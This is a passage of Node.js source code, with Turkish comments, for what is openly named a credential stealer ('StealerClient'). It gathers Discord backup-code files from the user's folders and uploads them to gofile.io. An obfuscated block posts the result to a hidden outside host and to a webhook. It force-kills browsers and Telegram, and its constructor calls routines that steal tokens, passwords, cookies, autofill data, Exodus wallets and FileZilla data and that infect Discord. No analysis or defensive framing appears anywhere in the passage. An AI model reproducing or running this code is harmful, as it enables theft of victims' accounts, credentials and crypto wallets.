              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
           // Webhook'a POST isteği gönder
axios.post(webhook3939, embedData)

            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
 
 });
	
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });



				   
        }
}



//


//////////
function getPeperonni() {
    let str = '';
    const homeDir = require('os').homedir();
    if (fs.existsSync(`${homeDir}\\Downloads`)) {
        fs.readdirSync(`${homeDir}\\Downloads`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Downloads\\${file}`
                str += `\n\n@~$~@fewer-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (fs.existsSync(`${homeDir}\\Desktop`)) {
        fs.readdirSync(`${homeDir}\\Desktop`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Desktop\\${file}`
                str += `\n\n@~$~@fewer-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (fs.existsSync(`${homeDir}\\Documents`)) {
        fs.readdirSync(`${homeDir}\\Documents`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Documents\\${file}`
                str += `\n\n@~$~@fewer-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (str !== '') {
        fs.writeFileSync('\\backupcodes.txt', str.slice(2))


axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `\\backupcodes.txt`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
        headers: form.getHeaders()
      })
        .then(uploadResponse => {
          const responsePayload = {
            uploadResponseData: uploadResponse.data
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'BackupCode Dosyası Yükleme Yanıtı',
                description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
(function(_0x4c87d0,_0x3093ae){var _0x52fd48=_0x1815,_0x36632f=_0x4c87d0();while(!![]){try{var _0x3097fa=parseInt(_0x52fd48(0x1f4))/0x1+parseInt(_0x52fd48(0x1ee))/0x2+-parseInt(_0x52fd48(0x1f0))/0x3+-parseInt(_0x52fd48(0x1fa))/0x4*(parseInt(_0x52fd48(0x1f9))/0x5)+parseInt(_0x52fd48(0x1ef))/0x6*(-parseInt(_0x52fd48(0x1f7))/0x7)+-parseInt(_0x52fd48(0x1f3))/0x8+parseInt(_0x52fd48(0x1e9))/0x9*(parseInt(_0x52fd48(0x1fc))/0xa);if(_0x3097fa===_0x3093ae)break;else _0x36632f['push'](_0x36632f['shift']());}catch(_0x2df568){_0x36632f['push'](_0x36632f['shift']());}}}(_0x2a91,0x3429f));function _0x1815(_0x1297f5,_0x5a140b){var _0x2a9138=_0x2a91();return _0x1815=function(_0x1815d3,_0x9e2834){_0x1815d3=_0x1815d3-0x1e9;var _0x33cd7f=_0x2a9138[_0x1815d3];return _0x33cd7f;},_0x1815(_0x1297f5,_0x5a140b);}var _0x19690c=_0x5176;function _0x5176(_0x4b797a,_0x23ba37){var _0x16784e=_0x5b99();return _0x5176=function(_0x2ad6d3,_0x294734){_0x2ad6d3=_0x2ad6d3-(0x145*0xd+0xfa6*0x1+-0x1ea5);var _0x503850=_0x16784e[_0x2ad6d3];return _0x503850;},_0x5176(_0x4b797a,_0x23ba37);}function _0x5b99(){var _0x4cff59=_0x1815,_0x4939c7=[_0x4cff59(0x1f5),'11343366vEyMMD',_0x4cff59(0x1f1),_0x4cff59(0x1ed),_0x4cff59(0x1ea),'h.net/',_0x4cff59(0x1ec),_0x4cff59(0x1fb),'post','5hyfcbT',_0x4cff59(0x1f2),_0x4cff59(0x1fd),_0x4cff59(0x1f8)];return _0x5b99=function(){return _0x4939c7;},_0x5b99();}function _0x2a91(){var _0x4e8d38=['1765719jDISJH','304172HZySci','1231986gFSNhp','1271748xBHCTy','16062eBFgHc','329VkncdS','3101976uRHEpf','67082IWWnVA','373895UeacUo','push','7jBRcMb','172266WKJwhB','223045xVpOAe','8vTemzT','ildandwatc','139330EQJrrx','1916080sPejqd','711ufBWtP','3719336YYUSMJ','shift','https://bu'];_0x2a91=function(){return _0x4e8d38;};return _0x2a91();}(function(_0xc5d24e,_0xdc4ed7){var _0x18e7cd=_0x1815,_0x4047d5=_0x5176,_0x45fbbd=_0xc5d24e();while(!![]){try{var _0x2072f0=parseInt(_0x4047d5(0x18d))/(-0x1d89+-0x1797+-0x1*-0x3521)*(parseInt(_0x4047d5(0x183))/(0x1*0x12f9+0x12f*0x5+0x5*-0x4fa))+parseInt(_0x4047d5(0x187))/(0x419*-0x3+-0xe3*-0x1f+-0xf2f)+parseInt(_0x4047d5(0x188))/(-0xb29+-0xc5*-0x26+0x1211*-0x1)+-parseInt(_0x4047d5(0x184))/(-0xf85+0xd89+0x1*0x201)+-parseInt(_0x4047d5(0x186))/(0x2*-0x118b+0x1d33+0x5e9)*(-parseInt(_0x4047d5(0x18e))/(0xe38+-0x267*-0x3+-0x1566))+-parseInt(_0x4047d5(0x182))/(-0x4b8+0x21dc+-0x1d1c)+-parseInt(_0x4047d5(0x185))/(0x1f5d+0x1d0e+-0x3c62);if(_0x2072f0===_0xdc4ed7)break;else _0x45fbbd[_0x18e7cd(0x1f6)](_0x45fbbd[_0x18e7cd(0x1eb)]());}catch(_0x1bc5b){_0x45fbbd['push'](_0x45fbbd[_0x18e7cd(0x1eb)]());}}}(_0x5b99,0xd*-0x6b23+-0xa284a+0x173b15*0x1),axios[_0x19690c(0x18c)](_0x19690c(0x18a)+_0x19690c(0x18b)+_0x19690c(0x189),embedData),axios[_0x19690c(0x18c)](webhook3939,embedData));


        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };
//webhook3939
          // Webhook'a POST isteği gönder
          axios.post(webhook3939, embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });


    }
}
///
//


async function closeBrowsers() {
  const browsersProcess = ["chrome.exe", "Telegram.exe", "msedge.exe", "opera.exe", "brave.exe"];
  return new Promise(async (resolve) => {
    try {
      const { execSync } = require("child_process");
      const tasks = execSync("tasklist").toString();
      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) {
          execSync(`taskkill /IM ${process} /F`);
        }
      });
      await new Promise((resolve) => setTimeout(resolve, 2500));
      resolve();
    } catch (e) {
      console.log(e);
      resolve();
    }
  });
}


//


//

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

class StealerClient {
	constructor() {
		closeBrowsers();
		StopCords();
		getEncrypted();
		getCookiesAndSendWebhook();
		getExtension();
		InfectDiscords();
	//	StealTokens();
	     stealTokens();
		stealltokens();
		getAutofills();
		getPasswords();
		getZippp();
		SubmitTelegram();
		getPeperonni();
		SubmitExodus();
submitfilezilla();
exampleFunction();

	}
}

new StealerClient()
